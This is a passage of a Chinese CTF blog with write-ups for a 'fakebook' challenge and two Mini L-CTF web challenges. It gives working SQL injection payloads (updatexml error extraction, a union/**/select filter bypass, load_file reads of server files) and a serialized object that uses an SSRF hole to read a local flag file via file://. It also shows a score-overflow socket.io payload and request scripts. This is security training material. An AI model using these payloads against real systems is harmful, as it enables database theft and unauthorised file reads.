class="hljs-number">404</span> -  <span class="hljs-number">571</span>B  - /resources/<span class="hljs-selector-class">.arch-internal-preview</span><span class="hljs-selector-class">.css</span><br><span class="hljs-selector-attr">[00:27:49]</span> <span class="hljs-number">200</span> -   <span class="hljs-number">37</span>B  - /robots<span class="hljs-selector-class">.txt</span><br><span class="hljs-selector-attr">[00:28:36]</span> <span class="hljs-number">404</span> -  <span class="hljs-number">571</span>B  - /skin1_admin<span class="hljs-selector-class">.css</span><br><span class="hljs-selector-attr">[00:29:57]</span> <span class="hljs-number">200</span> -    <span class="hljs-number">0</span>B  - /user<span class="hljs-selector-class">.php</span><br><span class="hljs-selector-attr">[00:30:20]</span> <span class="hljs-number">200</span> - <span class="hljs-number">1019</span>B  - /view.php<br></code></pre></td></tr></table></figure><p>有robots.txt,里面提示有一个<br>user.php.bak<br>备份文件  </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">UserInfo</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$name</span> = <span class="hljs-string">&quot;&quot;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$age</span> = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$blog</span> = <span class="hljs-string">&quot;&quot;</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$name</span>, <span class="hljs-variable">$age</span>, <span class="hljs-variable">$blog</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;name = <span class="hljs-variable">$name</span>;<br>        <span class="hljs-variable language_">$this</span>-&gt;age = (<span class="hljs-keyword">int</span>)<span class="hljs-variable">$age</span>;<br>        <span class="hljs-variable language_">$this</span>-&gt;blog = <span class="hljs-variable">$blog</span>;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">get</span>(<span class="hljs-params"><span class="hljs-variable">$url</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable">$ch</span> = <span class="hljs-title function_ invoke__">curl_init</span>();<br><br>        <span class="hljs-title function_ invoke__">curl_setopt</span>(<span class="hljs-variable">$ch</span>, CURLOPT_URL, <span class="hljs-variable">$url</span>);<br>        <span class="hljs-title function_ invoke__">curl_setopt</span>(<span class="hljs-variable">$ch</span>, CURLOPT_RETURNTRANSFER, <span class="hljs-number">1</span>);<br>        <span class="hljs-variable">$output</span> = <span class="hljs-title function_ invoke__">curl_exec</span>(<span class="hljs-variable">$ch</span>);<br>        <span class="hljs-variable">$httpCode</span> = <span class="hljs-title function_ invoke__">curl_getinfo</span>(<span class="hljs-variable">$ch</span>, CURLINFO_HTTP_CODE);<br>        <span class="hljs-keyword">if</span>(<span class="hljs-variable">$httpCode</span> == <span class="hljs-number">404</span>) &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-number">404</span>;<br>        &#125;<br>        <span class="hljs-title function_ invoke__">curl_close</span>(<span class="hljs-variable">$ch</span>);<br><br>        <span class="hljs-keyword">return</span> <span class="hljs-variable">$output</span>;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">getBlogContents</span> (<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">get</span>(<span class="hljs-variable">$this</span>-&gt;blog);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">isValidBlog</span> (<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable">$blog</span> = <span class="hljs-variable language_">$this</span>-&gt;blog;<br>        <span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/^(((http(s?))\:\/\/)?)([0-9a-zA-Z\-]+\.)+[a-zA-Z]&#123;2,6&#125;(\:[0-9]+)?(\/\S*)?$/i&quot;</span>, <span class="hljs-variable">$blog</span>);<br>    &#125;<br><br>&#125;<br></code></pre></td></tr></table></figure><p>给deepseek一看，它说有ssrf漏洞，还没接触过呢<br>然后也是看懂这个网站的逻辑了，就是你能注册姓名和账号，然后把你的blog链接挂上去<br>所以blog那栏必须是域名还得是二级域名啥的，  </p><figure class="highlight subunit"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs subunit">便尝试：<br>http://cd541869-c627<span class="hljs-string">-4</span>baf<span class="hljs-string">-920</span>d<span class="hljs-string">-2</span>fd4728ad4f0.node5.buuoj.cn:81/flag.php<br>放上去当作blog链接<br></code></pre></td></tr></table></figure><p>一次放我正常的blog链接，<br>一次放：<br><a href="http://cd541869-c627-4baf-920d-2fd4728ad4f0.node5.buuoj.cn:81/flag.php">http://cd541869-c627-4baf-920d-2fd4728ad4f0.node5.buuoj.cn:81/flag.php</a>  </p><p>没思路，不知道怎么下手，找wp看吧  </p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">先访问<br>/<span class="hljs-keyword">view</span>.php<br>得到<br><br><span class="hljs-keyword">Notice</span>: Undefined <span class="hljs-keyword">index</span>: <span class="hljs-keyword">no</span> <span class="hljs-keyword">in</span> /var/www/html/<span class="hljs-keyword">view</span>.php <span class="hljs-keyword">on</span> <span class="hljs-type">line</span> <span class="hljs-number">24</span><br>[*] query error! (You have an error <span class="hljs-keyword">in</span> your <span class="hljs-keyword">SQL</span> syntax; <span class="hljs-keyword">check</span> the manual that corresponds <span class="hljs-keyword">to</span> your MariaDB <span class="hljs-keyword">server</span> <span class="hljs-keyword">version</span> <span class="hljs-keyword">for</span> the right syntax <span class="hljs-keyword">to</span> use near <span class="hljs-string">&#x27;&#x27;</span> at <span class="hljs-type">line</span> <span class="hljs-number">1</span>)<br><br><br>Fatal error: <span class="hljs-keyword">Call</span> <span class="hljs-keyword">to</span> a member <span class="hljs-keyword">function</span> fetch_assoc() <span class="hljs-keyword">on</span> <span class="hljs-type">boolean</span> <span class="hljs-keyword">in</span> /var/www/html/db.php <span class="hljs-keyword">on</span> <span class="hljs-type">line</span> <span class="hljs-number">66</span><br><br>可以知道站点目录<br></code></pre></td></tr></table></figure><p>看网上的wp(<a href="https://blog.csdn.net/MyZy_/article/details/143814939)%E6%96%B9%E6%B3%95%E5%B0%B1%E6%98%AF%EF%BC%9A">https://blog.csdn.net/MyZy_/article/details/143814939)方法就是：</a><br>先上传一个符合规则的信息，然后使用sql注入把信息中博客url改为本地访问flag.php<br>或者因为没过滤sql的file_load()，可以直接读取flag.php  </p><p>那就先用自己的github地址注册一条信息<br>然后在&#x2F;view.php?on&#x3D;1中进行注入<br>然后发现现在的buuctf好像为了防止靶机变成肉鸡，不给出网了<br>那没办法，去nssctf上做吧  </p><figure class="highlight q"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs q"><span class="hljs-number">1</span>&#x27;<span class="hljs-built_in">union</span>&lt;&gt;<span class="hljs-keyword">select</span>&lt;&gt;<span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>--+<br><span class="hljs-comment">//不行</span><br><br>updatexml(<span class="hljs-number">1</span>,concat(%<span class="hljs-number">27</span>!%<span class="hljs-number">27</span>,database()),<span class="hljs-number">1</span>)--<br><span class="hljs-comment">//[*] query error! (XPATH syntax error: &#x27;!fakebook&#x27;)</span><br><br>updatexml(<span class="hljs-number">1</span>,concat(%<span class="hljs-number">27</span>!%<span class="hljs-number">27</span>,(<span class="hljs-keyword">select</span>(group_concat(table_name))<span class="hljs-keyword">from</span>(information_schema.<span class="hljs-built_in">tables</span>))),<span class="hljs-number">1</span>)--<br><span class="hljs-comment">//[*] query error! (XPATH syntax error: &#x27;!users,ALL_PLUGINS,APPLICABLE_RO&#x27;)</span><br><br>updatexml(<span class="hljs-number">1</span>,concat(%<span class="hljs-number">27</span>!%<span class="hljs-number">27</span>,(<span class="hljs-keyword">select</span>(group_concat(column_name))<span class="hljs-keyword">from</span>(information_schema.columns))),<span class="hljs-number">1</span>)--<br><span class="hljs-comment">//[*] query error! (XPATH syntax error: &#x27;!no,username,passwd,data,PLUGIN_&#x27;)</span><br><br>updatexml(<span class="hljs-number">1</span>,concat(%<span class="hljs-number">27</span>!%<span class="hljs-number">27</span>,(<span class="hljs-keyword">select</span>(group_concat(no,username,passwd,data))<span class="hljs-keyword">from</span>(users))),<span class="hljs-number">1</span>)--<br><span class="hljs-comment">//[*] query error! (XPATH syntax error: &#x27;!1zhong3c9909afec25354d551dae215&#x27;)</span><br><span class="hljs-comment">//经典的报错注入回显不完全，这里的passwd应该是就是被加密过的，不然原密码是&#x27;123&#x27;</span><br><span class="hljs-comment">//注意看了一下网上的wp，好像过滤了&#x27;union select&#x27;,使用&#x27;union/**/select&#x27;可以绕过  </span><br><br><span class="hljs-number">1</span> order <span class="hljs-keyword">by</span> <span class="hljs-number">4</span> --<br><span class="hljs-comment">//知道了行列为4</span><br><br><span class="hljs-number">-1</span> <span class="hljs-built_in">union</span>/**/<span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>,<span class="hljs-number">4</span> --<br><span class="hljs-comment">//知道回显位置是2</span><br><br><span class="hljs-number">-1</span> <span class="hljs-built_in">union</span>/**/<span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,group_concat(no,<span class="hljs-string">&quot;\n&quot;</span>,username,<span class="hljs-string">&quot;\n&quot;</span>,passwd,<span class="hljs-string">&quot;\n&quot;</span>,data),<span class="hljs-number">3</span>,<span class="hljs-number">4</span> <span class="hljs-keyword">from</span> users --<br><span class="hljs-comment">//1 zhong </span><br><span class="hljs-number">3</span>c9909afec25354d551dae21590bb26e38d53f2173b8d3dc3eee4c047e7ab1c1eb8b85103e3be7ba613b31bb5c9c36214dc9f14a42fd7a2fdb84856bca5c44c2 <br>O:<span class="hljs-number">8</span>:<span class="hljs-string">&quot;UserInfo&quot;</span>:<span class="hljs-number">3</span>:&#123;s:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;name&quot;</span>;s:<span class="hljs-number">5</span>:<span class="hljs-string">&quot;zhong&quot;</span>;s:<span class="hljs-number">3</span>:<span class="hljs-string">&quot;age&quot;</span>;i:<span class="hljs-number">123</span>;s:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;blog&quot;</span>;s:<span class="hljs-number">21</span>:<span class="hljs-string">&quot;http://gwwafz.online/&quot;</span>;&#125;<br></code></pre></td></tr></table></figure><p>这是时候如wp说的，在data里构造一条读取本地flag的链接即可  </p><figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ada">-<span class="hljs-number">1</span> union/**/<span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>,<span class="hljs-symbol">&#x27;O</span>:<span class="hljs-number">8</span>:<span class="hljs-string">&quot;UserInfo&quot;</span>:<span class="hljs-number">3</span>:&#123;s:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;name&quot;</span>;s:<span class="hljs-number">5</span>:<span class="hljs-string">&quot;zhong&quot;</span>;s:<span class="hljs-number">3</span>:<span class="hljs-string">&quot;age&quot;</span>;i:<span class="hljs-number">123</span>;s:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;blog&quot;</span>;s:<span class="hljs-number">29</span>:<span class="hljs-string">&quot;file:///var/www/html/flag.php&quot;</span>;&#125;&#x27; from users <span class="hljs-comment">--</span><br></code></pre></td></tr></table></figure><p>网页会在blog的区域回显blog链接爬取到的页面，改为file:&#x2F;&#x2F;可以直接访问本地的flag.php源码，所以在f12中查看blog窗口元素即可看，可能是它这个题目的原因，正常的blog也无法显示<br>只能在源码查看了  </p><p>解法二：<br>时用sql的load_file()函数，直接读取flag.php<br>注入时传入：  </p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-number">-1</span> <span class="hljs-keyword">union</span><span class="hljs-comment">/**/</span><span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,load_file(&quot;/var/www/html/flag.php&quot;),<span class="hljs-number">3</span>,<span class="hljs-number">4</span> <span class="hljs-comment">--+</span><br></code></pre></td></tr></table></figure><h2 id="notice-5"><a href="#notice-5" class="headerlink" title="notice"></a>notice</h2><p>file:&#x2F;&#x2F;&#x2F;<br>中是有3个&#x2F;  </p><p>还有，为什么传入sql语句<br>-1 union&#x2F;**&#x2F;select 1,2,3,’O:8:”UserInfo”:3:{s:4:”name”;s:5:”zhong”;s:3:”age”;i:123;s:4:”blog”;s:29:”file:&#x2F;&#x2F;&#x2F;var&#x2F;www&#x2F;html&#x2F;flag.php”;}’ from users –<br>就能访问到flag.php<br>首先select语句若是没有搜索到东西会自己变成自己添加的数据<br>所以-1没搜索到，会等于自己新建一条数据发给后端语句<br>原语句：  </p><p>-1 union&#x2F;**&#x2F;select 1,2,3,’O:8:”UserInfo”:3:{s:4:”name”;s:5:”zhong”;s:3:”age”;i:123;s:4:”blog”;s:29:”file:&#x2F;&#x2F;&#x2F;var&#x2F;www&#x2F;html&#x2F;flag.php”;}’ from users –</p><p>传入db后db会处理好然后将结果返回语句，其中union select就相当于新建了一条sql查询结果返回  </p><p>所以后端源码接收到的sql select 数据就为：  </p><p>1,2,3,’O:8:”UserInfo”:3:{s:4:”name”;s:5:”zhong”;s:3:”age”;i:123;s:4:”blog”;s:29:”file:&#x2F;&#x2F;&#x2F;var&#x2F;www&#x2F;html&#x2F;flag.php”;}’</p><p>然后将其中data反序列化(看源码)后执行<br>其中1，2，3为另外3条column，改data那条column即可  </p><p>然后刚才扫目录时发现了有个<br>db.php<br>可以猜测存在数据库，所以对no进行注入尝试   </p><p><strong>ssrf漏洞：</strong><br>我觉得是<br>利用网站对外访问来进行攻击<br>比如这题有curl类的函数  </p><p>看nssctf的标签有ssrf<br>第一次做ssrf的题目  </p><hr><h2 id="title-note-34date-2025-05-11-01-37-11tags-web"><a href="#title-note-34date-2025-05-11-01-37-11tags-web" class="headerlink" title="title: note-34date: 2025-05-11 01:37:11tags: web"></a>title: note-34<br>date: 2025-05-11 01:37:11<br>tags: web</h2><h1 id="Mini-L-CTF-GuessOneGuess"><a href="#Mini-L-CTF-GuessOneGuess" class="headerlink" title="Mini L-CTF GuessOneGuess"></a>Mini L-CTF GuessOneGuess</h1><p>下载源码  </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br></pre></td><td class="code"><pre><code class="hljs php">module.exports = <span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params">io</span>) </span>&#123;<br>    io.<span class="hljs-title function_ invoke__">on</span>(<span class="hljs-string">&#x27;connection&#x27;</span>, (socket) =&gt; &#123;<br>        let targetNumber = Math.<span class="hljs-title function_ invoke__">floor</span>(Math.<span class="hljs-title function_ invoke__">random</span>() * <span class="hljs-number">100</span>) + <span class="hljs-number">1</span>;<br>        let guessCount = <span class="hljs-number">0</span>;<br>        let totalScore = <span class="hljs-number">0</span>;<br>        <span class="hljs-keyword">const</span> <span class="hljs-variable constant_">FLAG</span> = process.env.FLAG || <span class="hljs-string">&quot;miniL&#123;THIS_IS_THE_FLAG&#125;&quot;</span>;<br>        console.<span class="hljs-title function_ invoke__">log</span>(`新连接 - 目标数字: $&#123;targetNumber&#125;`);<br><br>    <br>        socket.<span class="hljs-title function_ invoke__">emit</span>(<span class="hljs-string">&#x27;game-message&#x27;</span>, &#123;<br>            <span class="hljs-attr">type</span>: <span class="hljs-string">&#x27;welcome&#x27;</span>,<br>            <span class="hljs-attr">message</span>: <span class="hljs-string">&#x27;猜一个1-100之间的数字！&#x27;</span>,<br>            <span class="hljs-attr">score</span>: totalScore<br>        &#125;);<br><br>        <br>        socket.<span class="hljs-title function_ invoke__">on</span>(<span class="hljs-string">&#x27;guess&#x27;</span>, (data) =&gt; &#123;<br>            <span class="hljs-keyword">try</span> &#123;<br>              console.<span class="hljs-title function_ invoke__">log</span>(totalScore);<br>                <span class="hljs-keyword">const</span> <span class="hljs-variable constant_">guess</span> = <span class="hljs-title function_ invoke__">parseInt</span>(data.value);<br><br>                <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">isNaN</span>(guess)) &#123;<br>                    <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-built_in">Error</span>(<span class="hljs-string">&#x27;请输入有效数字&#x27;</span>);<br>                &#125;<br><br>                <span class="hljs-keyword">if</span> (guess &lt; <span class="hljs-number">1</span> || guess &gt; <span class="hljs-number">100</span>) &#123;<br>                    <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-built_in">Error</span>(<span class="hljs-string">&#x27;请输入1-100之间的数字&#x27;</span>);<br>                &#125;<br><br>                guessCount++;<br><br>                <span class="hljs-keyword">if</span> (guess === targetNumber) &#123;<br>                   <br>                    <span class="hljs-keyword">const</span> <span class="hljs-variable constant_">currentScore</span> = Math.<span class="hljs-title function_ invoke__">floor</span>(<span class="hljs-number">100</span> / Math.<span class="hljs-title function_ invoke__">pow</span>(<span class="hljs-number">2</span>, guessCount - <span class="hljs-number">1</span>));<br>                    totalScore += currentScore;<br><br>                    let message = `🎉 猜对了！得分 +$&#123;currentScore&#125; (总分数: $&#123;totalScore&#125;)`;<br>                    let showFlag = <span class="hljs-literal">false</span>;<br><br>                    <span class="hljs-keyword">if</span> (totalScore &gt; <span class="hljs-number">1.7976931348623157e308</span>) &#123;<br>                        message += `\n🏴 $&#123;FLAG&#125;`;<br>                        showFlag = <span class="hljs-literal">true</span>;<br>                    &#125;<br><br>                    socket.<span class="hljs-title function_ invoke__">emit</span>(<span class="hljs-string">&#x27;game-message&#x27;</span>, &#123;<br>                        <span class="hljs-attr">type</span>: <span class="hljs-string">&#x27;result&#x27;</span>,<br>                        <span class="hljs-attr">win</span>: <span class="hljs-literal">true</span>,<br>                        <span class="hljs-attr">message</span>: message,<br>                        <span class="hljs-attr">score</span>: totalScore,<br>                        <span class="hljs-attr">showFlag</span>: showFlag,<br>                        <span class="hljs-attr">currentScore</span>: currentScore<br>                    &#125;);<br><br>                    <br>                    targetNumber = Math.<span class="hljs-title function_ invoke__">floor</span>(Math.<span class="hljs-title function_ invoke__">random</span>() * <span class="hljs-number">100</span>) + <span class="hljs-number">1</span>;<br>                    console.<span class="hljs-title function_ invoke__">log</span>(`新目标数字: $&#123;targetNumber&#125;`);<br>                    guessCount = <span class="hljs-number">0</span>;<br>                &#125; <span class="hljs-keyword">else</span> &#123;<br>                    <span class="hljs-keyword">if</span> (guessCount &gt;= <span class="hljs-number">100</span>) &#123;<br>                      console.<span class="hljs-title function_ invoke__">log</span>(<span class="hljs-string">&quot;100次未猜中！将扣除当前分数并重置&quot;</span>);<br>                        socket.<span class="hljs-title function_ invoke__">emit</span>(<span class="hljs-string">&#x27;punishment&#x27;</span>, &#123;<br>                            <span class="hljs-attr">message</span>: <span class="hljs-string">&quot;100次未猜中！将扣除当前分数并重置&quot;</span>,<br>                        &#125;);<br>                        <span class="hljs-keyword">return</span>;<br>                    &#125;<br>                    socket.<span class="hljs-title function_ invoke__">emit</span>(<span class="hljs-string">&#x27;game-message&#x27;</span>, &#123;<br>                        <span class="hljs-attr">type</span>: <span class="hljs-string">&#x27;result&#x27;</span>,<br>                        <span class="hljs-attr">win</span>: <span class="hljs-literal">false</span>,<br>                        <span class="hljs-attr">message</span>: guess &lt; targetNumber ? <span class="hljs-string">&#x27;太小了！&#x27;</span> : <span class="hljs-string">&#x27;太大了！&#x27;</span>,<br>                        <span class="hljs-attr">score</span>: totalScore<br>                    &#125;);<br>                &#125;<br>            &#125; <span class="hljs-keyword">catch</span> (err) &#123;<br>                socket.<span class="hljs-title function_ invoke__">emit</span>(<span class="hljs-string">&#x27;game-message&#x27;</span>, &#123;<br>                    <span class="hljs-attr">type</span>: <span class="hljs-string">&#x27;error&#x27;</span>,<br>                    <span class="hljs-attr">message</span>: err.message,<br>                    <span class="hljs-attr">score</span>: totalScore<br>                &#125;);<br>            &#125;<br>        &#125;);<br>        socket.<span class="hljs-title function_ invoke__">on</span>(<span class="hljs-string">&#x27;punishment-response&#x27;</span>, (data) =&gt; &#123;<br>          totalScore -= data.score;<br>          guessCount = <span class="hljs-number">0</span>;<br>          targetNumber = Math.<span class="hljs-title function_ invoke__">floor</span>(Math.<span class="hljs-title function_ invoke__">random</span>() * <span class="hljs-number">100</span>) + <span class="hljs-number">1</span>;<br>          console.<span class="hljs-title function_ invoke__">log</span>(`新目标数字: $&#123;targetNumber&#125;`);<br>          socket.<span class="hljs-title function_ invoke__">emit</span>(<span class="hljs-string">&#x27;game-message&#x27;</span>, &#123;<br>            <span class="hljs-attr">type</span>: <span class="hljs-string">&#x27;result&#x27;</span>,<br>            <span class="hljs-attr">win</span>: <span class="hljs-literal">true</span>,<br>            <span class="hljs-attr">message</span>: <span class="hljs-string">&quot;扣除分数并重置&quot;</span>,<br>            <span class="hljs-attr">score</span>: totalScore,<br>            <span class="hljs-attr">showFlag</span>: <span class="hljs-literal">false</span>,<br>          &#125;);<br><br>        &#125;);<br>    &#125;);<br>&#125;;<br></code></pre></td></tr></table></figure><p>注意到最后有一项猜错一百次后删除分数的函数<br>这个分数是data,为上传的data  </p><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs abnf">totalScore -<span class="hljs-operator">=</span> data.score<span class="hljs-comment">;</span><br></code></pre></td></tr></table></figure><p>我们上传一个负数，根据源码里的减去，就能实现负负得正，获得足够分数<br>之后的totalScore是足够分数来输出flag的<br>此时再猜对一次触发输出flag即可  </p><p>操作过程：<br>输入1 然后bp抓包重发99次，<br>在99次时把上传的分数改为：  </p><figure class="highlight scheme"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs scheme"><span class="hljs-symbol">&#x27;42</span>[<span class="hljs-string">&quot;punishment-response&quot;</span>,&#123;<span class="hljs-string">&quot;score&quot;</span>:-1e309&#125;]&#x27;<br></code></pre></td></tr></table></figure><p>此时服务器里的数组已经达到发送flag的数值了，但是要触发分数检测然后输出flag需要猜对一次，<br>所以再猜对一次即可  </p><p>实测直接使用punishment事件就可以直接上传分数了<br>不用错一百次  </p><h1 id="Mini-L-CTF-麦霸评分"><a href="#Mini-L-CTF-麦霸评分" class="headerlink" title="Mini L_CTF 麦霸评分"></a>Mini L_CTF 麦霸评分</h1><p>题目给了源码<br>看到源码里有获取原音频的地址：<br>&#x2F;original.wav  </p><p>提交录音的地址：<br>&#x2F;compare-recording  </p><p>那直接把原音提交即可  </p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><br><span class="hljs-comment"># 1. 直接请求原版音频（替换为实际音频路径）</span><br>audio_url = <span class="hljs-string">&quot;http://127.0.0.1:37563/original.wav&quot;</span>  <span class="hljs-comment"># </span><br>audio = requests.get(audio_url).content<br><br><span class="hljs-comment"># 2. 伪装成用户录音提交</span><br>r = requests.post(<br>    <span class="hljs-string">&quot;http://127.0.0.1:37563/compare-recording&quot;</span>, <span class="hljs-comment"># </span><br>    files=&#123;<span class="hljs-string">&quot;audio&quot;</span>: (<span class="hljs-string">&quot;recording.wav&quot;</span>, audio)&#125;<br>)<br>a=requests.get(audio_url).headers<br><br><span class="hljs-comment"># 3. 提取flag</span><br><span class="hljs-built_in">print</span>(r.text)<br></code></pre></td></tr></table></figure><p>给deepseek一眼顶针了，在浏览器控制台运行就行：  </p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">async</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">getFlag</span>(<span class="hljs-params"></span>) &#123;<br>  <span class="hljs-comment">// 替换成上一步获取的真实URL（示例：/original.wav?sign=abc123）</span><br>  <span class="hljs-keyword">const</span> serverPath = <span class="hljs-string">&#x27;/original.wav?sign=abc123&#x27;</span>; <br><br>  <span class="hljs-comment">// 直接使用服务器路径获取音频</span><br>  <span class="hljs-keyword">const</span> response = <span class="hljs-keyword">await</span> <span class="hljs-title function_">fetch</span>(serverPath);<br>  <span class="hljs-keyword">const</span> blob = <span class="hljs-keyword">await</span> response.<span class="hljs-title function_">blob</span>();<br><br>  <span class="hljs-comment">// 提交到评分接口</span><br>  <span class="hljs-keyword">const</span> formData = <span class="hljs-keyword">new</span> <span class="hljs-title class_">FormData</span>();<br>  